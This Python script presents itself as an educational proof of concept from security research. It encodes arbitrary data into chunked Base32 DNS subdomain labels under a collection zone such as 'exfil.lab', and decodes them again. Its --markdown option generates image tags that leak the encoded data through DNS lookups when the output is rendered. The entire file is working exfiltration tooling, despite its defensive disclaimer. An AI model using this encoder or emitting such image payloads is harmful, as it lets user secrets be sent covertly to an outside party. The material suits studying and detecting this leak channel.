#!/usr/bin/env python3
"""
DNS Exfiltration Encoder - Educational Proof of Concept
========================================================

This script demonstrates the encoding mechanism used for DNS-based
data exfiltration. FOR EDUCATIONAL AND DEFENSIVE PURPOSES ONLY.

Usage:
    python dns_encoder.py "SECRET_DATA" example.lab
    python dns_encoder.py --decode "KRSXG5BAKJUW4ZZA" 

Part of: Dual Critical Failures Research
Author: Kai Aizen (SnailSploit)
"""

import argparse
import base64
import sys


def encode_for_dns(data: str, zone: str, chunk_size: int = 40) -> list[str]:
    """
    Encode data into DNS-safe subdomain labels.
    
    Args:
        data: The string data to encode
        zone: The DNS zone (e.g., 'exfil.lab')
        chunk_size: Maximum characters per label (DNS limit is 63)
    
    Returns:
        List of fully qualified domain names with encoded chunks
    """
    # Use Base32 for DNS-safe alphabet (A-Z, 2-7, =)
    # Base32 is preferred over Base64 for DNS as it's case-insensitive
    encoded = base64.b32encode(data.encode()).decode()
    
    # Remove padding for cleaner DNS labels
    encoded_clean = encoded.rstrip('=')
    
    # Split into chunks
    chunks = [encoded_clean[i:i+chunk_size] for i in range(0, len(encoded_clean), chunk_size)]
    
    # Generate FQDNs with index markers
    fqdns = []
    for idx, chunk in enumerate(chunks):
        # Format: p{index:03d}_db.{chunk}.{zone}
        fqdn = f"p{idx+1:03d}_db.{chunk}.{zone}"
        fqdns.append(fqdn)
    
    return fqdns


def decode_from_dns(labels: list[str]) -> str:
    """
    Decode data from DNS subdomain labels.
    
    Args:
        labels: List of encoded chunks (without zone suffix)
    
    Returns:
        Decoded original string
    """
    # Sort by index prefix (p001, p002, etc.)
    sorted_labels = sorted(labels, key=lambda x: int(x.split('_')[0][1:]))
    
    # Extract payload chunks
    chunks = [label.split('_db.')[1] if '_db.' in label else label for label in sorted_labels]
    
    # Concatenate
    encoded = ''.join(chunks)
    
    # Add padding if needed (Base32 requires padding to be multiple of 8)
    padding_needed = (8 - len(encoded) % 8) % 8
    encoded_padded = encoded + '=' * padding_needed
    
    # Decode
    decoded = base64.b32decode(encoded_padded).decode()
    
    return decoded


def generate_markdown_payload(fqdns: list[str]) -> str:
    """
    Generate Markdown image tags that would trigger DNS lookups.
    
    Args:
        fqdns: List of fully qualified domain names
    
    Returns:
        Markdown content with embedded images
    """
    markdown_lines = []
    for fqdn in fqdns:
        # Image syntax triggers browser DNS lookup
        markdown_lines.append(f"![loading](https://{fqdn}/pixel.png)")
    
    return '\n'.join(markdown_lines)


def print_banner():
    """Print educational banner."""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║        DNS EXFILTRATION ENCODER - EDUCATIONAL TOOL           ║
╠══════════════════════════════════════════════════════════════╣
║  This tool demonstrates encoding for DNS-based data          ║
║  exfiltration as documented in the Dual Critical Failures    ║
║  research. FOR EDUCATIONAL AND DEFENSIVE PURPOSES ONLY.      ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)


def main():
    parser = argparse.ArgumentParser(
        description='DNS Exfiltration Encoder - Educational Tool',
        epilog='Part of Dual Critical Failures Research by SnailSploit'
    )
    
    parser.add_argument('data', nargs='?', help='Data to encode')
    parser.add_argument('zone', nargs='?', default='exfil.lab', help='DNS zone (default: exfil.lab)')
    parser.add_argument('--decode', '-d', action='store_true', help='Decode mode')
    parser.add_argument('--markdown', '-m', action='store_true', help='Generate Markdown payload')
    parser.add_argument('--chunk-size', '-c', type=int, default=40, help='Chunk size (default: 40)')
    parser.add_argument('--quiet', '-q', action='store_true', help='Quiet mode (no banner)')
    
    args = parser.parse_args()
    
    if not args.quiet:
        print_banner()
    
    if not args.data:
        parser.print_help()
        sys.exit(1)
    
    if args.decode:
        # Decode mode - expects comma-separated labels
        labels = args.data.split(',')
        try:
            decoded = decode_from_dns(labels)
            print(f"\n[DECODED] {decoded}")
        except Exception as e:
            print(f"\n[ERROR] Decoding failed: {e}")
            sys.exit(1)
    else:
        # Encode mode
        fqdns = encode_for_dns(args.data, args.zone, args.chunk_size)
        
        print(f"\n[INPUT] {args.data}")
        print(f"[ZONE]  {args.zone}")
        print(f"[CHUNKS] {len(fqdns)} DNS queries required\n")
        
        print("=" * 60)
        print("GENERATED FQDNS:")
        print("=" * 60)
        for fqdn in fqdns:
            print(f"  {fqdn}")
        
        if args.markdown:
            print("\n" + "=" * 60)
            print("MARKDOWN PAYLOAD (triggers DNS on render):")
            print("=" * 60)
            print(generate_markdown_payload(fqdns))
        
        # Verification
        print("\n" + "=" * 60)
        print("VERIFICATION (re-decode):")
        print("=" * 60)
        labels = [fqdn.split('.')[0] + '_db.' + fqdn.split('.')[1] for fqdn in fqdns]
        verify = decode_from_dns(labels)
        print(f"  Original:  {args.data}")
        print(f"  Recovered: {verify}")
        print(f"  Match: {'✓ YES' if args.data == verify else '✗ NO'}")


if __name__ == '__main__':
    main()
